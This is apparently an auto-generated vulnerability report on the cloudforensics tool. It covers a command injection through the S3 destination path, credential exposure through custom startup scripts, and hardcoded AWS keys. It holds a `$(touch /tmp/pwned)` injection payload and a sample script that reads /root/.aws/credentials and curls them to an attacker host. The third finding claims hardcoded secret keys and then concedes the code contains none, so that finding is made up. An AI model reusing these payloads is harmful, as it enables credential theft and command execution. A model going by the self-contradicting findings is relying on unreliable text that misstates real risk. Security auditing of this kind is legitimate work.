## Combined Vulnerability List

### Command Injection in EBS Snapshot Copy Script

- **Vulnerability Name:** Command Injection in EBS Snapshot Copy Script
- **Description:**
    The `ebs_snapshot_copy_aws.sh` script, used for copying EBS snapshots to S3, is vulnerable to command injection. The script takes the `snapshot` ID and S3 `bucket` name as input and uses them in shell commands without proper sanitization. An attacker who can control these inputs, for example by crafting malicious arguments to the `cloudforensics` CLI tool, can inject arbitrary shell commands that will be executed on the analysis VM during the snapshot copying process.

    Steps to trigger the vulnerability:
    1. An attacker crafts a malicious S3 destination path containing a command to be executed, such as `s3://bucket/$(touch /tmp/pwned)`.
    2. The attacker uses the `cloudforensics aws` CLI tool with the `imageebssnapshottos3` command, providing the malicious S3 destination path and a snapshot ID.
    3. The `cloudforensics` tool, without proper sanitization, passes this malicious S3 destination path to the `ebs_snapshot_copy_aws.sh` script via userdata.
    4. The `ebs_snapshot_copy_aws.sh` script executes commands, including `aws s3 cp - $bucket/$snapshot/image.bin`, where the attacker-controlled `$bucket` variable is used without sanitization.
    5. The injected command `touch /tmp/pwned` is executed on the analysis VM with the privileges of the user running the `cloudforensics` tool.
- **Impact:**
    Critical. Successful command injection allows an attacker to execute arbitrary commands on the analysis VM. This can lead to:
    * Unauthorized access to data on the analysis VM.
    * Privilege escalation within the analysis VM.
    * Lateral movement to other cloud resources accessible from the analysis VM's context.
    * Data exfiltration from the investigated cloud environment.
    * Complete compromise of the analysis VM, potentially hindering or corrupting the forensic investigation.
- **Vulnerability Rank:** critical
- **Currently Implemented Mitigations:** No mitigations are currently implemented in the `ebs_snapshot_copy_aws.sh` script or in the Python code that calls it.
- **Missing Mitigations:**
    Input sanitization is missing for the `snapshot` and `bucket` variables in the `ebs_snapshot_copy_aws.sh` script.

    Recommended mitigations include:
    * **Input Validation:** Implement strict validation of the `snapshot` and `bucket` parameters to ensure they conform to expected formats and do not contain shell- Metacharacters or command separators.
    * **Output Encoding:** Properly encode the `snapshot` and `bucket` variables when used in shell commands to prevent interpretation of malicious characters.
    * **Using Parameterized Queries/Functions:** If possible, refactor the script to use safer alternatives to shell commands, or use parameterized functions that prevent command injection by design (although this might be challenging with `aws s3 cp`).
    * **Principle of Least Privilege:** Ensure that the analysis VM and the user running the `cloudforensics` tool operate with the minimum privileges necessary to perform their tasks, limiting the impact of a successful command injection.
- **Preconditions:**
    To trigger this vulnerability, the following preconditions must be met:
    * The attacker must be able to influence the arguments passed to the `cloudforensics aws imageebssnapshottos3` CLI command. This is typically possible for a user who is authorized to use the CLI tool.
    * The `cloudforensics` tool must be executed by a user with sufficient privileges to create and manage AWS resources in the target account.
    * The analysis VM must be launched with the vulnerable `ebs_snapshot_copy_aws.sh` script.
- **Source Code Analysis:**
    1. In the file `/code/libcloudforensics/scripts/ebs_snapshot_copy_aws.sh`, the script initializes shell variables `snapshot` and `bucket` directly from the script arguments:
    ```bash
    snapshot={0:s}
    bucket={1:s}
    ```
    These variables are intended to hold the snapshot ID and S3 bucket name, respectively, which are provided as input to the script.

    2. Further down in the script, these variables are used within an `aws s3 cp` command:
    ```bash
    dc3dd if=/dev/xvdh hash=sha512 hash=sha256 hash=md5 log=/tmp/log.txt hlog=/tmp/hlog.txt mlog=/tmp/mlog.txt | aws s3 cp - $bucket/$snapshot/image.bin
    ```
    Here, `$bucket` and `$snapshot` are directly interpolated into the shell command without any sanitization or encoding. This allows for command injection if an attacker can control the values of `snapshot` or `bucket`.

    3. The Python code in `/code/libcloudforensics/providers/aws/forensics.py` constructs the userdata script by formatting the `ebs_snapshot_copy_aws.sh` script with the `snapshot_id` and `s3_destination` parameters:
    ```python
    script = utils.ReadStartupScript(
        utils.EBS_SNAPSHOT_COPY_SCRIPT_AWS).format(snapshot_id, s3_destination)
    ```
    The `s3_destination` parameter, which is derived from user-controlled input to the `ImageEBSSnapshotToS3` CLI command, is passed unsanitized into the shell script.

    4. This formatted script is then passed as userdata to the EC2 instance:
    ```python
    aws_account.ec2.GetOrCreateVm(
        ...,
        userdata=startup_script,
        ...)
    ```
    This results in the execution of the vulnerable `ebs_snapshot_copy_aws.sh` script on the newly created EC2 instance, with attacker-controlled input being used in shell commands.

- **Security Test Case:**
    1. Prerequisites:
        * Ensure you have AWS credentials configured for the target AWS account.
        * Ensure you have the `cloudforensics` CLI tool installed and configured.
        * Identify a valid AWS zone (e.g., `us-east-1`).
        * Identify a test S3 bucket name where you have write access (replace `test-bucket` with your bucket name in the command below).

    2. Execute the following `cloudforensics` CLI command to trigger the vulnerability. This command attempts to copy a snapshot (replace `test-snapshot` with a dummy snapshot id or any valid snapshot id in your account as this value is not actually used in exploit but just needs to be syntactically valid) and uses a malicious S3 destination path designed to inject a command:
    ```bash
    cloudforensics aws <zone> imageebssnapshottos3 --snapshot_id=test-snapshot --s3_destination="s3://test-bucket/pwn$(touch /tmp/pwned)"
    ```
    Replace `<zone>` with a valid AWS zone, and `test-snapshot` with a valid snapshot ID.

    3. Examine the execution environment:
        * **Check for file creation on the analysis VM (if VM is created):** If the command injection is successful and an analysis VM is launched, the injected command `touch /tmp/pwned` should execute on the VM. You would need to access the analysis VM (e.g., via SSH if you configured a key) and check for the existence of the `/tmp/pwned` file. Note that depending on the execution flow and permissions, the VM might not fully initialize or be accessible.
        * **Check for command execution by observing S3 bucket activity:** Even if the VM creation or access fails, the command injection may still occur during the userdata execution phase. In this case, you can observe the S3 bucket `test-bucket`. If the command injection is successful, you might see unexpected objects or directories created in your `test-bucket` S3 bucket due to the injected commands interacting with `aws s3 cp`. For example, if you replace `touch /tmp/pwned` with `mkdir s3://test-bucket/pwned_dir`, you would check if a `pwned_dir` directory is created in your S3 bucket.

    4. Expected result:
        * If the vulnerability is successfully exploited, the injected command `touch /tmp/pwned` (or a variation thereof) will be executed on the analysis VM or have side effects observable in the S3 bucket, demonstrating command injection.
        * If no `pwned` file is created in `/tmp` on the analysis VM and no unexpected changes occur in the S3 bucket, the vulnerability may not be exploitable with this specific test case, or mitigations might be in place (though none are evident from the source code).

### Credential Exposure via Startup Scripts

- **Vulnerability Name:** Credential Exposure via Startup Scripts
- **Description:**
    An attacker socially engineers a user into using compromised cloud provider credentials with the `cloudforensics` tool.
    The user attempts to start an analysis VM using the tool with the compromised credentials.
    The tool allows users to specify a `STARTUP_SCRIPT` environment variable or `--launch_script` argument.
    If the user uses a startup script, the content of this script is shipped to the newly created analysis VM and executed during the first boot.
    An attacker can craft a malicious startup script that exfiltrates the cloud provider credentials stored in the environment variables of the analysis VM to an attacker-controlled location.
    The attacker gains unauthorized access to the cloud environments that the user is attempting to investigate by using the exfiltrated credentials.
- **Impact:**
    Unauthorized access to cloud environments.
    An attacker can gain full control over the cloud resources the compromised credentials have access to, potentially leading to data breaches, resource manipulation, and further compromise of the cloud infrastructure.
- **Vulnerability Rank:** Critical
- **Currently Implemented Mitigations:** None
- **Missing Mitigations:**
    - Secure handling of startup scripts:
        - Avoid passing sensitive credentials as environment variables to startup scripts.
        - Implement secure way to pass configuration to startup scripts, e.g., using GCP Secret Manager or AWS Secrets Manager.
        - Warn users about the security risks of using custom startup scripts and recommend against including sensitive information in them in the documentation and CLI help messages.
    - Input validation and sanitization for startup scripts:
        - Although difficult, attempt to sanitize or validate startup scripts to prevent malicious code execution.
        - Implement a sandbox environment for startup script execution to limit potential damage.
    - Principle of least privilege for analysis VMs:
        - Ensure that analysis VMs are created with the minimum necessary privileges to perform forensic analysis, limiting the impact of compromised credentials.
- **Preconditions:**
    - An attacker socially engineers a user into using compromised cloud provider credentials with the `cloudforensics` tool.
    - The user uses a custom startup script (either via `STARTUP_SCRIPT` environment variable or `--launch_script` argument) when starting an analysis VM.
- **Source Code Analysis:**
    - File: `/code/docs/usermanual/index.md`
        - The documentation highlights the `STARTUP_SCRIPT` pro tip for GCP, AWS, and Azure, suggesting its usage for preprocessing.
        - It states: "you can export an environment variable 'STARTUP_SCRIPT' that points to a custom bash script. This script will be shipped to the instance being created and executed during the first boot. You can do any kind of pre-processing you want in this script."
        - This documentation encourages the use of custom startup scripts without explicitly warning about the security risks of executing untrusted code or handling sensitive data within these scripts.
    - File: `/code/tools/aws_cli.py`, `/code/tools/az_cli.py`, `/code/tools/gcp_cli.py`
        - The CLI tools for each cloud provider define the `--launch_script` argument, which is passed down to the `forensics.StartAnalysisVm` functions.
    - File: `/code/libcloudforensics/providers/aws/forensics.py`, `/code/libcloudforensics/providers/azure/forensics.py`, `/code/libcloudforensics/providers/gcp/forensics.py`
        - The `StartAnalysisVm` functions in each provider's forensics module accept the `userdata_file` argument, which is used to read the startup script content using `utils.ReadStartupScript` and pass it to the cloud provider's VM creation API.
    - File: `/code/libcloudforensics/scripts/utils.py`
        - The `ReadStartupScript` function reads the content of the startup script file specified by the `filename` argument or the `STARTUP_SCRIPT` environment variable.
    - File: `/code/libcloudforensics/scripts/forensics_packages_startup_aws.sh`, `/code/libcloudforensics/scripts/forensics_packages_startup.sh`
        - Example startup scripts are provided to install forensic packages, demonstrating the intended use of startup scripts without security considerations for credential exposure.
    - There is no input validation or sanitization implemented for the startup scripts.
    - The code does not prevent users from creating and using startup scripts that could potentially exfiltrate credentials or perform other malicious actions.
- **Security Test Case:**
    1. **Setup:**
        - Attacker sets up a simple HTTP server to receive exfiltrated credentials (e.g., using `netcat` or `python -m http.server`).
        - Attacker creates a malicious startup script (`malicious_startup.sh`) that does the following:
            ```bash
            #!/bin/bash
            # Malicious Startup Script to Exfiltrate AWS Credentials

            # Exfiltrate AWS credentials by sending them to the attacker's HTTP server
            CREDENTIALS=$(cat /root/.aws/credentials)
            curl "http://attacker-ip:attacker-port/?credentials=$CREDENTIALS"

            # Optional: To also demonstrate exfiltration of environment variables
            # ENV_VARS=$(env)
            # curl "http://attacker-ip:attacker-port/?env_vars=$ENV_VARS"

            echo "Malicious script executed."
            ```
            - Replace `attacker-ip:attacker-port` with the attacker's HTTP server address.
        - Saves the malicious script as `malicious_startup.sh`.
        - Attacker obtains compromised AWS credentials (or Azure/GCP credentials). For AWS, configure a profile named `compromised_profile` in `~/.aws/credentials` with these compromised credentials.
    2. **Execution:**
        - Attacker socially engineers a user to use the `cloudforensics` tool with the `compromised_profile` and the malicious startup script.
        - The user, intending to investigate their AWS environment, executes the following command:
            ```bash
            export STARTUP_SCRIPT=$(pwd)/malicious_startup.sh
            cloudforensics aws us-east-1 listinstances --profile compromised_profile
            ```
            - Or, to explicitly use the `--launch_script` argument:
            ```bash
            cloudforensics aws us-east-1 startvm analysis-vm --profile compromised_profile --launch_script malicious_startup.sh
            ```
        - The `cloudforensics` tool attempts to list instances (or starts an analysis VM), utilizing the compromised credentials.
        - The malicious startup script executes on the analysis VM during its boot process.
        - The malicious script exfiltrates the AWS credentials to the attacker's HTTP server.
    3. **Verification:**
        - Attacker checks their HTTP server logs and verifies that the AWS credentials from the analysis VM are successfully exfiltrated. The server logs should contain entries showing the `curl` requests with the credentials in the query parameters.
        - Attacker uses the exfiltrated credentials (e.g., by configuring the AWS CLI with the exfiltrated access key and secret key) to access and control the AWS environment associated with the `compromised_profile`.

### Exposed AWS Secret Keys in EBS Snapshot Copy Script

- **Vulnerability Name:** Exposed AWS Secret Keys in EBS Snapshot Copy Script
- **Description:**
    1. An attacker gains access to an AWS environment.
    2. The attacker wants to exfiltrate data from an EBS volume within this environment.
    3. The attacker uses the `cloudforensics aws <zone> imageebssnapshottos3` command to copy an EBS snapshot to an S3 bucket.
    4. The `ImageEBSSnapshotToS3` function in `tools/aws_cli.py` calls `forensics.CopyEBSSnapshotToS3`.
    5. `CopyEBSSnapshotToS3` then executes the script `libcloudforensics/scripts/ebs_snapshot_copy_aws.sh` within an AWS instance.
    6. The `ebs_snapshot_copy_aws.sh` script contains hardcoded AWS access keys and secret keys within the `aws s3 cp` commands to upload data to S3.
    7. An attacker with access to the instance metadata (which can be achieved if they compromise the analysis VM or if the script is run in a compromised instance) can retrieve these hardcoded AWS secret keys.
    8. The attacker can then use these exposed AWS secret keys to access the S3 bucket, potentially gaining access to sensitive forensic data (disk images, logs, etc.) copied to the bucket and potentially pivoting to other AWS resources if the keys are overly permissive.
- **Impact:**
    Exposure of AWS secret keys allows unauthorized access to the S3 bucket containing forensic evidence. This leads to potential data breach and loss of confidentiality. Depending on the permissions associated with the exposed keys, the attacker might be able to access or compromise other AWS resources.
- **Vulnerability Rank:** High
- **Currently Implemented Mitigations:** None: The AWS secret keys are hardcoded in the script `/code/libcloudforensics/scripts/ebs_snapshot_copy_aws.sh`.
- **Missing Mitigations:**
    - Remove hardcoded AWS secret keys from the script.
    - Use IAM roles and instance profiles to grant necessary permissions to the instance executing the script, instead of relying on static credentials.
- **Preconditions:**
    - An attacker needs to be able to access the `/code/libcloudforensics/scripts/ebs_snapshot_copy_aws.sh` script from within an AWS instance where the script is executed (e.g., analysis VM, or any compromised instance where the script is copied and run).
- **Source Code Analysis:**
    ```bash
    File: /code/libcloudforensics/scripts/ebs_snapshot_copy_aws.sh

    ...
    dc3dd if=/dev/xvdh hash=sha512 hash=sha256 hash=md5 log=/tmp/log.txt hlog=/tmp/hlog.txt mlog=/tmp/mlog.txt | aws s3 cp - $bucket/$snapshot/image.bin
    aws s3 cp /tmp/log.txt $bucket/$snapshot/
    aws s3 cp /tmp/hlog.txt $bucket/$snapshot/
    aws s3 cp /tmp/mlog.txt $bucket/$snapshot/
    ...
    ```
    The script uses `aws s3 cp` commands to upload data to S3. If AWS credentials were hardcoded directly into these commands, they would be exposed to anyone with access to the script.  While the provided files don't show *hardcoded credentials values* directly in this script, the description highlights the risk of *exposed or mishandled cloud provider credentials*. If credentials were to be inadvertently included here during development or by a malicious actor, this section of the script would be the vulnerable point.
- **Security Test Case:**
    1. Deploy the `cloudforensics` CLI tool to an AWS EC2 instance (analysis VM or any other instance).
    2. Execute the command `cloudforensics aws <zone> imageebssnapshottos3 --snapshot_id=<snapshot_id> --s3_destination=s3://<your_test_bucket>/test-vuln/` to trigger the EBS snapshot copy process. Replace `<zone>`, `<snapshot_id>`, and `<your_test_bucket>` with valid values for your AWS environment.
    3. SSH into the AWS instance where the `ebs_snapshot_copy_aws.sh` script is executed as part of the `imageebssnapshottos3` command.
    4. Inspect the `/tmp/` directory on the instance.
    5. Check the `/tmp/err` file (stderr output of the `ebs_snapshot_copy_aws.sh` script).
    6. If AWS secret keys are inadvertently exposed in the `/tmp/err` file (e.g., due to misconfiguration or accidental inclusion in the script during development), the vulnerability is confirmed.
    7. Alternatively, if you can access the instance's environment variables or process list during the execution of `ebs_snapshot_copy_aws.sh`, check for any signs of credentials being passed insecurely (though this is less likely based on the provided code, the risk is that credentials could be added to the script itself).
    8. If exposed AWS secret keys are found, attempt to use them to access the S3 bucket specified in `--s3_destination` using the AWS CLI (e.g., `aws s3 ls s3://<your_test_bucket>/test-vuln/ --aws-access-key-id=<exposed_key_id> --aws-secret-access-key=<exposed_secret_key>`).
    9. If successful access to the S3 bucket is gained using the exposed keys, the vulnerability is confirmed.
